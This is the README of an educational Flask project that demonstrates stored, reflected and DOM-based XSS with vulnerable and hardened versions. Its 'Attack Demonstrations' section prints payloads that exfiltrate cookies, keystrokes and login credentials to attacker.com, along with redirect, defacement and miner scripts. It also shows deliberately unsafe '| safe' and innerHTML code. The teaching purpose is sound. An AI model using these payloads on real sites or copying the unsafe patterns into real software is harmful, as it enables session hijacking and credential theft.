🔐 XSS Vulnerability Demonstration Project

[![Python](https://img.shields.io/badge/Python-3.7%2B-blue.svg)](https://www.python.org/)
[![Flask](https://img.shields.io/badge/Flask-3.0.0-green.svg)](https://flask.palletsprojects.com/)
[![License](https://img.shields.io/badge/License-Educational-orange.svg)](LICENSE)
[![Security](https://img.shields.io/badge/Security-XSS%20Demo-red.svg)](https://owasp.org/www-community/attacks/xss/)

## 📋 Table of Contents

- Project Overview
- Features
- Project Structure
- Quick Start
- Application Variants
- The Vulnerabilities Explained
- Security Implementations
- Testing Guide
- Attack Demonstrations
- Security Best Practices
- Technical Details
- Learning Resources
- License

---

## 🎯 Project Overview

This is a **comprehensive cybersecurity demonstration project** showcasing various **XSS (Cross-Site Scripting)** vulnerabilities in web applications. The project includes multiple implementations demonstrating:

- **Stored XSS** - Malicious scripts persisted in database
- **Reflected XSS** - Scripts reflected from URL parameters
- **DOM-based XSS** - Client-side script manipulation

Each vulnerability type has both **vulnerable** and **secure** implementations, with progressively advanced security controls.

### 🎓 Educational Purpose

This project is designed for **educational purposes** to provide hands-on experience with:

✅ **Understanding Web Vulnerabilities**
- How different XSS attack types work
- Real-world exploitation techniques
- Impact on users and businesses

✅ **Secure Coding Practices**
- Output encoding strategies
- Input sanitization with Bleach
- Content Security Policy (CSP) implementation
- Security header configuration
- Cookie hardening (HttpOnly, SameSite)

✅ **Defense-in-Depth Architecture**
- Multiple security layers
- Progressive security hardening
- Professional-grade protections

**⚠️ WARNING: Vulnerable versions are intentionally insecure. Never deploy them in production!**

---

## ✨ Features

### 🎯 Multiple Implementation Levels

| Application | Port | Security Level | Description |
|------------|------|----------------|-------------|
| app_vulnerable.py | 5000 | 🔴 None | Basic stored XSS vulnerability |
| app_secure.py | 5001 | 🟢 Basic | Output encoding + basic CSP |
| app_secure_pro.py | 5001 | 🟢🟢 Professional | Bleach sanitization + hardened CSP + cookie security |
| app_reflected.py | 5002 | 🔴 None | Reflected XSS vulnerability |
| app_reflected_secure.py | 5002 | 🟢 Secure | Protected reflected XSS |
| app_dom.py | 5003 | 🔴 None | DOM-based XSS vulnerability |
| app_secure_dom.py | 5003 | 🟢 Secure | Protected DOM-based XSS |

### 🛡️ Security Features Demonstrated

- **Output Encoding** - Jinja2 auto-escaping
- **Input Sanitization** - Bleach library for HTML cleaning
- **Content Security Policy** - Basic and hardened CSP headers
- **Security Headers** - X-XSS-Protection, X-Frame-Options, X-Content-Type-Options
- **Cookie Hardening** - HttpOnly, SameSite flags
- **Input Validation** - Length limits and whitelisting

---

## 🏗️ Project Structure

```
CyberSecurity-project/
│
├── 📄 Application Files
│   ├── app_vulnerable.py           # Stored XSS - Vulnerable
│   ├── app_secure.py               # Stored XSS - Basic Security
│   ├── app_secure_pro.py          # Stored XSS - Professional Security
│   ├── app_reflected.py           # Reflected XSS - Vulnerable
│   ├── app_reflected_secure.py    # Reflected XSS - Secure
│   ├── app_dom.py                 # DOM-based XSS - Vulnerable
│   ├── app_secure_dom.py          # DOM-based XSS - Secure
│   └── init_db.py                 # Database initialization
│
├── 🎨 Templates
│   └── templates/
│       ├── index.html                      # Homepage (stored XSS)
│       ├── comments_vulnerable.html        # Vulnerable comments display
│       ├── comments_secure.html            # Secure comments display
│       ├── comments_secure_pro.html        # Professional secure display
│       ├── reflected_page.html             # Reflected XSS page
│       ├── reflected_page_secure.html      # Secure reflected page
│       ├── dom_page.html                   # DOM XSS page
│       └── dom_page_secure.html           # Secure DOM page
│
├── 🎨 Static Assets
│   └── static/
│       ├── main_dom_secure.js            # Secure DOM manipulation
│       ├── style_dom_secure.css          # DOM page styles
│       ├── style_reflected.css           # Reflected page styles
│       ├── style_stored_index.css        # Stored XSS index styles
│       └── style_stored.css              # Stored XSS comments styles
│
├── 📚 Documentation
│   ├── README.md                  # Complete project documentation (original)
│   ├── requirements.txt           # Python dependencies
│   └── .gitignore                # Git exclusions
│
└── 🗄️ Database
    └── comments.db               # SQLite database (created on init)
```

---

## 🚀 Quick Start

### Prerequisites

| Requirement | Version | Purpose |
|------------|---------|---------|
| Python | 3.7+ | Application runtime |
| pip | Latest | Package management |
| Flask | 3.0.0 | Web framework |
| Bleach | Latest | HTML sanitization (for pro version) |
| Web Browser | Modern | Chrome/Firefox/Edge with DevTools |

### Installation

#### 1️⃣ Clone the Repository
```bash
git clone https://github.com/nizarrahmoun/CyberSecurity-project.git
cd CyberSecurity-project
```

#### 2️⃣ Install Dependencies
```bash
pip install -r requirements.txt
```

**requirements.txt includes:**
```txt
Flask==3.0.0
bleach>=6.0.0
```

#### 3️⃣ Initialize Database
```bash
python init_db.py
```

**Expected output:**
```
Database initialized successfully!
Created table: comments
```

### Running Applications

#### 🔓 Stored XSS - Vulnerable Version
```bash
python app_vulnerable.py
```
- **URL**: http://localhost:5000
- **Purpose**: Demonstrates stored XSS vulnerability
- **Warning**: Contains intentional security flaws

#### 🔒 Stored XSS - Basic Secure Version
```bash
python app_secure.py
```
- **URL**: http://localhost:5001
- **Security**: Output encoding + basic CSP

#### 🔒🔒 Stored XSS - Professional Secure Version
```bash
python app_secure_pro.py
```
- **URL**: http://localhost:5001
- **Security**: Bleach sanitization + hardened CSP + HttpOnly cookies

#### 🔓 Reflected XSS - Vulnerable Version
```bash
python app_reflected.py
```
- **URL**: http://localhost:5002
- **Purpose**: Demonstrates reflected XSS vulnerability

#### 🔒 Reflected XSS - Secure Version
```bash
python app_reflected_secure.py
```
- **URL**: http://localhost:5002
- **Security**: Input validation + output encoding

#### 🔓 DOM-based XSS - Vulnerable Version
```bash
python app_dom.py
```
- **URL**: http://localhost:5003
- **Purpose**: Demonstrates DOM-based XSS vulnerability

#### 🔒 DOM-based XSS - Secure Version
```bash
python app_secure_dom.py
```
- **URL**: http://localhost:5003
- **Security**: Safe DOM manipulation using `main_dom_secure.js`

---

## 🎓 Application Variants

### 1. Stored XSS Applications

#### 🔴 Vulnerable (`app_vulnerable.py`)
```python
# Vulnerable code - stores raw HTML in database
@app.route('/submit', methods=['POST'])
def submit_comment():
    comment_text = request.form.get('comment', '')
    # ⚠️ No sanitization - stores malicious scripts
    cursor.execute('INSERT INTO comments (text) VALUES (?)', (comment_text,))
```

```html
<!-- templates/comments_vulnerable.html -->
<!-- ⚠️ | safe bypasses auto-escaping -->
<div class="comment-text">{{ comment.text | safe }}</div>
```

#### 🟢 Basic Secure (`app_secure.py`)
```python
# Secure code - relies on output encoding
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self';"
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
```

```html
<!-- templates/comments_secure.html -->
<!-- ✅ Auto-escaping enabled (no | safe) -->
<div class="comment-text">{{ comment.text }}</div>
```

#### 🟢🟢 Professional Secure (`app_secure_pro.py`)
```python
import bleach  # Input sanitization library

@app.route('/submit', methods=['POST'])
def submit_comment():
    comment_text = request.form.get('comment', '')
    
    # ✅ Proactive sanitization before storage
    allowed_tags = ['b', 'i', 'strong', 'em', 'br']
    clean_comment = bleach.clean(comment_text, tags=allowed_tags, strip=True)
    
    cursor.execute('INSERT INTO comments (text) VALUES (?)', (clean_comment,))

@app.after_request
def set_security_headers(response):
    # ✅ Hardened CSP (no unsafe-inline)
    csp = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self'; "  # No 'unsafe-inline'
        "object-src 'none'; "
        "base-uri 'self';"
    )
    response.headers['Content-Security-Policy'] = csp
    response.headers['X-Frame-Options'] = 'DENY'
    return response

@app.route('/comments')
def comments():
    # ✅ Cookie hardening
    response.set_cookie(
        'session_id_pro', 
        'SECRET_TOKEN', 
        httponly=True,      # JavaScript cannot access
        samesite='Strict',  # CSRF protection
        secure=False        # Set True with HTTPS
    )
    return response
```

### 2. Reflected XSS Applications

#### 🔴 Vulnerable (`app_reflected.py`)
```python
# Vulnerable - reflects user input without encoding
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # ⚠️ Direct reflection in template
    return render_template('reflected_page.html', query=query)
```

```html
<!-- templates/reflected_page.html -->
<!-- ⚠️ | safe bypasses escaping -->
<p>Search results for: {{ query | safe }}</p>
```

**Attack URL:**
```
http://localhost:5002/search?q=<script>alert('XSS')</script>
```

#### 🟢 Secure (`app_reflected_secure.py`)
```python
# Secure - output encoding + validation
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # ✅ Input validation
    if len(query) > 100:
        query = query[:100]
    return render_template('reflected_page_secure.html', query=query)
```

```html
<!-- templates/reflected_page_secure.html -->
<!-- ✅ Auto-escaping enabled -->
<p>Search results for: {{ query }}</p>
```

### 3. DOM-based XSS Applications

#### 🔴 Vulnerable (`app_dom.py`)
```html
<!-- templates/dom_page.html -->
<script>
    // ⚠️ Unsafe DOM manipulation
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');
    document.getElementById('output').innerHTML = 'Hello ' + name;
    //                                   ↑
    //                                   └── innerHTML executes scripts
</script>
```

**Attack URL:**
```
http://localhost:5003/?name=<img src=x onerror=alert('XSS')>
```

#### 🟢 Secure (`app_secure_dom.py`)
```javascript
// static/main_dom_secure.js
const params = new URLSearchParams(window.location.search);
const name = params.get('name') || 'Guest';

// ✅ Safe DOM manipulation using textContent
document.getElementById('output').textContent = 'Hello ' + name;
//                                 ↑
//                                 └── textContent treats as text, not HTML
```

---

## 🔍 The Vulnerabilities Explained

### What is XSS?

**Cross-Site Scripting (XSS)** is a security vulnerability that allows attackers to inject malicious JavaScript into web pages viewed by other users.

### Types of XSS

#### 1️⃣ Stored XSS (Persistent)

```
Attack Flow:
1. Attacker → Submits malicious script via form
2. Application → Stores script in database (no sanitization)
3. Application → Retrieves and displays script (no encoding)
4. Victim Browser → Executes malicious script
```

**Example:** Comment system storing `<script>steal_cookies()</script>`

**Severity:** 🔴 **CRITICAL** - Affects all users who view the page

#### 2️⃣ Reflected XSS (Non-Persistent)

```
Attack Flow:
1. Attacker → Crafts malicious URL with script in parameter
2. Victim → Clicks malicious link
3. Application → Reflects parameter in response (no encoding)
4. Victim Browser → Executes malicious script
```

**Example:** `http://site.com/search?q=<script>alert(1)</script>`

**Severity:** 🟠 **HIGH** - Requires victim to click link

#### 3️⃣ DOM-based XSS

```
Attack Flow:
1. Attacker → Crafts URL with malicious fragment/parameter
2. Victim → Clicks link
3. JavaScript → Reads URL and manipulates DOM unsafely
4. Browser → Executes malicious script (never sent to server)
```

**Example:** `http://site.com/#<img src=x onerror=alert(1)>`

**Severity:** 🟠 **HIGH** - Client-side only, harder to detect

### Comparison Table

| Aspect | Stored XSS | Reflected XSS | DOM-based XSS |
|--------|-----------|---------------|---------------|
| **Storage** | ✅ Database | ❌ URL only | ❌ URL/Fragment |
| **Server-side** | ✅ Yes | ✅ Yes | ❌ Client-only |
| **Persistence** | ✅ Permanent | ❌ Temporary | ❌ Temporary |
| **Victim Count** | ⚠️ All users | 🎯 Link clickers | 🎯 Link clickers |
| **Detection** | Easier (stored) | Medium (logs) | Harder (no server) |
| **Example App** | app_vulnerable.py | app_reflected.py | app_dom.py |

---

## 🛡️ Security Implementations

### Defense Strategy: Multi-Layer Approach

```
┌─────────────────────────────────────────┐
│  Layer 5: Cookie Security               │ ← HttpOnly, SameSite, Secure flags
├─────────────────────────────────────────┤
│  Layer 4: Security Headers              │ ← X-Frame-Options, X-Content-Type
├─────────────────────────────────────────┤
│  Layer 3: Content Security Policy       │ ← CSP: script-src 'self'
├─────────────────────────────────────────┤
│  Layer 2: Output Encoding ⭐ PRIMARY    │ ← Auto-escaping, textContent
├─────────────────────────────────────────┤
│  Layer 1: Input Sanitization            │ ← Bleach, validation
└─────────────────────────────────────────┘
```

### Security Comparison Across Versions

| Security Control | Vulnerable | Basic Secure | Professional Secure |
|-----------------|-----------|--------------|---------------------|
| **Output Encoding** | ❌ Disabled (`\| safe`) | ✅ Enabled | ✅ Enabled |
| **Input Sanitization** | ❌ None | ❌ None | ✅ Bleach library |
| **CSP Headers** | ❌ None | ✅ Basic (`unsafe-inline`) | ✅ Hardened (no inline) |
| **Security Headers** | ❌ None | ✅ X-XSS-Protection | ✅ Full suite |
| **Cookie Hardening** | ❌ None | ❌ None | ✅ HttpOnly + SameSite |
| **Input Validation** | ❌ None | ⚠️ Optional | ✅ Comprehensive |

### Key Security Techniques

#### 1. Output Encoding

**How it works:** Converts HTML special characters to safe entities

```python
# Input:  <script>alert('XSS')</script>
# Output: &lt;script&gt;alert('XSS')&lt;/script&gt;
# Result: Displayed as text, not executed
```

**Implementation:**
- Remove `| safe` filter in Jinja2 templates
- Use `textContent` instead of `innerHTML` in JavaScript

#### 2. Input Sanitization (Bleach)

**How it works:** Removes/escapes dangerous HTML before storage

```python
import bleach

allowed_tags = ['b', 'i', 'strong', 'em', 'br']
clean_html = bleach.clean(user_input, tags=allowed_tags, strip=True)
```

**Benefits:**
- Proactive defense at storage layer
- Allows safe HTML formatting
- Used in app_secure_pro.py

#### 3. Content Security Policy (CSP)

**Basic CSP (app_secure.py):**
```python
"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
```

**Hardened CSP (app_secure_pro.py):**
```python
"default-src 'self'; script-src 'self'; style-src 'self'; object-src 'none'; base-uri 'self';"
```

**What CSP blocks:**
- ✅ `<script>alert(1)</script>` - Inline scripts
- ✅ `<script src="https://evil.com/malware.js"></script>` - External scripts
- ✅ `onclick="hack()"` - Inline event handlers

#### 4. Cookie Hardening

```python
response.set_cookie(
    'session_id', 
    'SECRET_VALUE',
    httponly=True,      # Prevents JavaScript access (XSS mitigation)
    samesite='Strict',  # CSRF protection
    secure=True         # HTTPS only (production)
)
```

**Protection against:**
- XSS cookie theft (even if XSS exists)
- CSRF attacks
- Man-in-the-middle attacks

---

## 🧪 Testing Guide

### Manual Testing

#### Test 1: Stored XSS

**Vulnerable App (`app_vulnerable.py`):**
```bash
python app_vulnerable.py
```

1. Visit http://localhost:5000
2. Submit comment: `<script>alert('Stored XSS Works!');</script>`
3. Click "View All Comments"
4. **Expected:** Alert box appears ✅ XSS confirmed

**Secure Apps:**
```bash
python app_secure.py
# OR
python app_secure_pro.py
```

1. Visit http://localhost:5001
2. Submit same payload
3. **Expected:** Payload displayed as text ✅ Attack blocked

#### Test 2: Reflected XSS

**Vulnerable App (`app_reflected.py`):**
```bash
python app_reflected.py
```

Visit: `http://localhost:5002/search?q=<script>alert('Reflected XSS')</script>`

**Expected:** Alert box appears ✅ XSS confirmed

**Secure App (`app_reflected_secure.py`):**
```bash
python app_reflected_secure.py
```

Visit same URL

**Expected:** Payload displayed as text ✅ Attack blocked

#### Test 3: DOM-based XSS

**Vulnerable App (`app_dom.py`):**
```bash
python app_dom.py
```

Visit: `http://localhost:5003/?name=<img src=x onerror=alert('DOM XSS')>`

**Expected:** Alert box appears ✅ XSS confirmed

**Secure App (`app_secure_dom.py`):**
```bash
python app_secure_dom.py
```

Visit same URL

**Expected:** Payload displayed as text ✅ Attack blocked

### Security Header Verification

1. Open Browser DevTools → Network tab
2. Visit any secure application
3. Click on response → Headers
4. Verify presence of:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

### Cookie Security Verification

1. Visit http://localhost:5001/comments (professional secure app)
2. Open DevTools → Application/Storage → Cookies
3. Find `session_id_pro` cookie
4. Verify flags:
   - ✅ HttpOnly
   - ✅ SameSite: Strict

---

## 💣 Attack Demonstrations

### 1. Simple Alert Box (PoC)
```html
<script>alert('XSS Vulnerability Confirmed!');</script>
```

### 2. Cookie Theft
```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Impact:** Session hijacking, account takeover

### 3. Keylogger
```html
<script>
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
});
</script>
```

**Impact:** Capture passwords and sensitive data

### 4. Fake Login Form
```html
<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:9999;">
    <form action="http://attacker.com/phish" method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button>Login</button>
    </form>
</div>
```

**Impact:** Credential harvesting

### 5. Page Defacement
```html
<script>
document.body.innerHTML = '<h1 style="color:red;">HACKED BY ATTACKER</h1>';
</script>
```

**Impact:** Reputation damage

### 6. Malicious Redirect
```html
<script>
window.location = 'https://malicious-site.com/malware';
</script>
```

**Impact:** Malware distribution

### 7. Cryptocurrency Miner
```html
<script>
function mine() {
    let result = 0;
    for(let i = 0; i < 10000000; i++) result += Math.sqrt(i);
    setTimeout(mine, 100);
}
mine();
</script>
```

**Impact:** Resource hijacking, high CPU usage

### Testing Checklist

**For each attack, capture:**
- [ ] Screenshot of payload submission
- [ ] Screenshot of exploit execution
- [ ] Browser DevTools Console output
- [ ] Network tab activity
- [ ] Before/after comparison

---

## 🛡️ Security Best Practices

### ❌ DON'T - Common Mistakes

| Mistake | Why Dangerous | Found In |
|---------|--------------|----------|
| Use `\| safe` filter | Bypasses auto-escaping | `comments_vulnerable.html` |
| Use `innerHTML` | Executes scripts | `dom_page.html` |
| Skip input validation | Allows malicious content | app_vulnerable.py |
| Forget security headers | No defense-in-depth | app_vulnerable.py |
| Trust user input | All input is potentially malicious | All vulnerable apps |

### ✅ DO - Best Practices

| Practice | Implementation | Found In |
|----------|---------------|----------|
| Output encoding | Remove `\| safe`, use auto-escape | `comments_secure.html` |
| Input sanitization | Use Bleach library | app_secure_pro.py |
| CSP headers | Restrict script sources | app_secure.py, app_secure_pro.py |
| Safe DOM methods | Use `textContent` not `innerHTML` | `main_dom_secure.js` |
| Cookie hardening | HttpOnly + SameSite flags | app_secure_pro.py |
| Input validation | Length limits, whitelists | app_reflected_secure.py |

### Security Implementation Checklist

**Development:**
- [ ] Enable framework auto-escaping (default in Jinja2)
- [ ] Never use `| safe` on user input
- [ ] Use `textContent` instead of `innerHTML`
- [ ] Implement input sanitization with Bleach
- [ ] Add CSP headers (preferably hardened)
- [ ] Set security headers (X-Frame-Options, etc.)
- [ ] Validate input lengths and types
- [ ] Use parameterized queries (SQLi prevention)

**Testing:**
- [ ] Test with common XSS payloads
- [ ] Verify security headers in Network tab
- [ ] Check CSP blocking in Console
- [ ] Test cookie security flags
- [ ] Run automated security scans (OWASP ZAP)

**Deployment:**
- [ ] Disable debug mode (`debug=False`)
- [ ] Use HTTPS in production
- [ ] Set `Secure` flag on cookies
- [ ] Configure proper CORS
- [ ] Regular security updates

---

## 💻 Technical Details

### Technology Stack

| Component | Technology | Version | Purpose |
|-----------|-----------|---------|---------|
| **Backend** | Python | 3.7+ | Application logic |
| **Web Framework** | Flask | 3.0.0 | HTTP routing |
| **Template Engine** | Jinja2 | 3.1+ | HTML rendering |
| **Sanitization** | Bleach | 6.0+ | HTML cleaning |
| **Database** | SQLite | 3.x | Data persistence |
| **Server** | Werkzeug | 3.0.1 | WSGI server |
| **Frontend** | HTML5/CSS3/JS | - | User interface |

### Database Schema

```sql
CREATE TABLE comments (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    text TEXT NOT NULL,           -- XSS payloads stored here
    timestamp TEXT NOT NULL
);
```

### Application Ports

| Application Type | Port | Files |
|-----------------|------|-------|
| Stored XSS | 5000-5001 | app_vulnerable.py, app_secure.py, app_secure_pro.py |
| Reflected XSS | 5002 | app_reflected.py, app_reflected_secure.py |
| DOM-based XSS | 5003 | app_dom.py, app_secure_dom.py |

---

## 📖 Learning Resources

### OWASP Resources
- [OWASP Top 10](https://owasp.org/Top10/) - A03:2021 Injection
- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [DOM-based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

### Documentation
- [Flask Security](https://flask.palletsprojects.com/en/latest/security/)
- [Jinja2 Auto-escaping](https://jinja.palletsprojects.com/en/latest/templates/#html-escaping)
- [Bleach Documentation](https://bleach.readthedocs.io/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

### Practice Platforms
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.eu/)

---

## 📜 License

**Educational Use License**

This project is created for **educational purposes only**.

### ✅ Permitted Use
- Academic study and research
- Security training and education
- Authorized penetration testing labs
- Learning web security concepts

### ❌ Prohibited Use
- Testing websites you don't own
- Unauthorized system access
- Malicious attacks
- Production deployment of vulnerable versions

### Disclaimer

**⚠️ IMPORTANT:**
- Vulnerable applications contain intentional security flaws
- Use only in controlled lab environments
- Author not responsible for misuse
- Unauthorized access to computer systems is illegal

---

## 👤 Author

**Cybersecurity Course Project**  
Academic Year: 2024-2025  
GitHub: [@nizarrahmoun](https://github.com/nizarrahmoun)

### Acknowledgments
- OWASP Foundation for security guidelines
- Flask and Jinja2 teams for secure frameworks
- Bleach team for sanitization library
- Cybersecurity community for resources

---

## 🎯 Quick Command Reference

```bash
# Initialize database
python init_db.py

# Run vulnerable stored XSS
python app_vulnerable.py          # Port 5000

# Run secure stored XSS (basic)
python app_secure.py             # Port 5001

# Run secure stored XSS (professional)
python app_secure_pro.py         # Port 5001

# Run vulnerable reflected XSS
python app_reflected.py          # Port 5002

# Run secure reflected XSS
python app_reflected_secure.py   # Port 5002

# Run vulnerable DOM-based XSS
python app_dom.py                # Port 5003

# Run secure DOM-based XSS
python app_secure_dom.py         # Port 5003
```

---

<div align="center">

### 🛡️ Remember: Use This Knowledge Responsibly

**Build secure applications, don't attack others.**

[![GitHub](https://img.shields.io/badge/GitHub-CyberSecurity--project-blue?logo=github)](https://github.com/nizarrahmoun/CyberSecurity-project)
[![OWASP](https://img.shields.io/badge/OWASP-Top%2010-orange)](https://owasp.org/Top10/)

**⭐ Star this repo if it helped you learn web security!**

</div>